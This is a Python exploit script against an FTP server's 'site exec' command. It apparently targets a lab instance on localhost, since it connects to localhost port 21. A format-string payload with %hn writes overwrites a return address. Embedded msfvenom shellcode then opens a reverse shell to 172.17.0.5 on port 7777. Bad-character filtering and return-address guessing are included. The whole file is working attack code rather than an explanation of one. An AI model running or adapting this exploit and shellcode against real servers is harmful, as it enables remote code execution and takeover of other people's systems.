#!/usr/bin/env python3

import socket
import struct

# POPS = 269
# PAD_BYTES = 2

POPS = 22
PAD_BYTES = 2

BAD_CHARS = b'\x00\x09\x0a\x0d\x20\x25\x2f'

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def has_bad_chars(msg):
    for char in msg:
        if char in BAD_CHARS:
            return True
    return False


def craft_exploit_string(pops, pad_bytes, return_addr_loc):
    # (0xffffb8c6) Pad
    exploit_str = pad_bytes * b'a'

    # (0xffffb8c8) Return addr location (lower) to write to (pop 269)
    packed = struct.pack('<I', return_addr_loc)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8cc) Return addr location (higher) to write to
    packed = struct.pack('<I', return_addr_loc + 2)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8d0) Shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.5 LPORT=7777 -f py -b '\x00\x09\x0a\x0d\x20\x25\x2f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a' (92 bytes)
    exploit_str += b"\x90" * 16
    exploit_str += b"\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    exploit_str += b"\x76\x0e\xef\x7d\x0c\x96\x83\xee\xfc\xe2\xf4\xde\xa6"
    exploit_str += b"\xfb\x75\xbc\x3e\x5f\xfc\xed\xf4\xed\x26\x89\xb0\x8c"
    exploit_str += b"\x05\xb6\xcd\x33\x5b\x6f\x34\x75\x6f\x87\xd1\x1d\x96"
    exploit_str += b"\xea\x15\x0e\x96\xf1\x1c\x85\x77\x5f\x1b\x5c\xc7\xbc"
    exploit_str += b"\xce\x0f\x1f\x0e\xb0\x8c\xc4\x87\x13\x23\xe5\x87\x15"
    exploit_str += b"\x23\xb9\x8d\x14\x85\x75\xbd\x2e\x85\x77\x5f\x76\xc1"
    exploit_str += b"\x16"

    # Write 0xb8d0 to the address at POP, which is the return addr location (lower)
    bytes_written = len(exploit_str)
    remaining_bytes = 0xc068 - bytes_written
    exploit_str += b'%' + bytes(str(remaining_bytes), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$hn'

    # Write 0xffff to the address at POP+1, which is the return addr location (higher)
    exploit_str += b'%' + bytes(str(0xffff - 0xc068), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 1), 'utf-8') + b'$hn'

    return exploit_str.replace(b'\xff', b'\xff\xff')


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    response = s.recv(65535)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(65535)
    return response


def main():
    # return_addr_guess = 0xffffb45c
    return_addr_guess = 0xffffc88c

    with socket.socket() as s:
        s.connect(('localhost', 21))
        banner(s)
        login(s)

        print(f'\n[*] Will be trying to write to {hex(return_addr_guess)}')
        exploit_str = craft_exploit_string(POPS, PAD_BYTES, return_addr_guess)
        print(f'[*] Exploit string that is going to be sent:')
        print(exploit_str)

        if not exploit_str:
            print(f'[*] Skipping {hex(return_addr_guess)}, has bad chars')
            return

        input('\nInput anything to continue...')
        response = site_exec(s, exploit_str)
        print(response)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

